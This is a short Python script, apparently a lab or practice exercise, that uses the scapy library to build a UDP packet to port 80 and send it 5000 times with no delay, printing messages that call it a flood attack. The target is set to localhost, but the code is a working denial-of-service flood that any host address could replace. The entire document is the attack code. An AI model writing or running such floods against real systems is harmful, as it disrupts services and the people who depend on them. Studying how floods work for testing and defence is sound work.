from scapy.all import IP, UDP, send

target_ip = "127.0.0.1"   

pkt = IP(dst=target_ip)/UDP(dport=80)

print("Starting Flood Attack...")

send(pkt, count=5000, inter=0)

print("Attack Done")